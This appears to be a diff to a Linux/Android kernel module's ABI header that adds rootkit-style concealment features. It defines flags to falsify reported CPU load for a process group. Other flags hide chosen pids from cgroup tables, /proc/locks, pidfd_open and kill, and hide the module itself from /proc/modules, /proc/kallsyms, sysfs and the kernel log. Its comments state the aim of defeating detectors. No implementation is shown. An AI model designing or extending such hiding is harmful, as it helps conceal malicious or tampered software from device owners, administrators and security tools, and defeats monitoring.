@@ -508,10 +508,10 @@ struct nbdriver_udp_read_request {
 #define NBDRIVER_IOC_UDP_STATUS \
     _IOR(NBDRIVER_IOC_MAGIC, 0x28, struct nbdriver_udp_status)
 
-/* CPU telemetry shaping, additive ABI 5. Rewrites the cputime values returned
- * by task_cputime_adjusted/thread_group_cputime_adjusted for one thread group,
- * so readers (top/ps/dumpsys) derive a bounded range instead of the real load.
- * Real accounting and scheduling are untouched; only an exit value is replaced. */
+/* CPU telemetry shaping, additive ABI 5. Rewrites what the proc seq_file
+ * handlers report for one thread group, so readers (top/ps/dumpsys) derive a
+ * bounded range instead of the real load. Real accounting and scheduling are
+ * untouched; only the text a reader receives is replaced. */
 #define NBDRIVER_FEATURE_CPU_VISIBILITY (1U << 24)
 #define NBDRIVER_CPU_VISIBILITY_QUERY 0U
 #define NBDRIVER_CPU_VISIBILITY_SET   1U
@@ -540,5 +540,44 @@ struct nbdriver_cpu_visibility_request {
 
 #define NBDRIVER_IOC_CPU_VISIBILITY \
     _IOWR(NBDRIVER_IOC_MAGIC, 0x29, struct nbdriver_cpu_visibility_request)
+
+/* Kernel-side complement to PROC_VISIBILITY. Hiding the /proc entry alone
+ * leaves the pid named in tables that are not proc_root children and that any
+ * unprivileged process can read:
+ *
+ *   /sys/fs/cgroup/cgroup.procs    (0755)
+ *   /sys/fs/cgroup/cgroup.threads  (0755)
+ *   /proc/locks                    (0444)
+ *
+ * "Listed in a table but absent from /proc" is a computable fingerprint, so
+ * those rows are suppressed as well. No userspace call is needed: the feature
+ * follows the same target table PROC_VISIBILITY uses and is reported through
+ * the existing feature mask. Nothing is relocated, so no private cgroup
+ * directory is created for a detector to enumerate. */
+#define NBDRIVER_FEATURE_PID_TABLE_VISIBILITY (1U << 25)
+
+/* Suppresses this module's own name in /proc/modules. Without it, any app can
+ * read "nbdriver <size> <refs> Live (OE)" and learn that a third-party driver
+ * is loaded, no matter how well individual pids are hidden. */
+#define NBDRIVER_FEATURE_MODULE_TRACE_VISIBILITY (1U << 26)
+
+/* Drops this module's own symbol rows from /proc/kallsyms. Addresses are
+ * already zeroed by kptr_restrict=2, but names and the [module] tag stay
+ * visible, which is enough to identify the driver's purpose. */
+#define NBDRIVER_FEATURE_KALLSYMS_VISIBILITY (1U << 27)
+
+/* Drops /sys/module/nbdriver from the sysfs listing. The directory itself
+ * stays functional for root tooling; only the readdir entry is suppressed. */
+#define NBDRIVER_FEATURE_SYSFS_MODULE_VISIBILITY (1U << 28)
+
+/* Makes pidfd_open(2) and kill/tkill/tgkill report ESRCH for hidden pids. Both
+ * resolve the pid through the kernel pid hash rather than procfs, so they would
+ * otherwise still confirm that a hidden process exists. */
+#define NBDRIVER_FEATURE_PIDFD_VISIBILITY (1U << 29)
+
+/* Drops this module's own pr_* records at vprintk_store(), so its name never
+ * enters the printk ring buffer. Selectively narrow: unlike dmesg_restrict it
+ * leaves the kernel log readable for every other consumer. */
+#define NBDRIVER_FEATURE_PRINTK_VISIBILITY (1U << 30)
 
 #endif /* NBDRIVER_ABI_H */
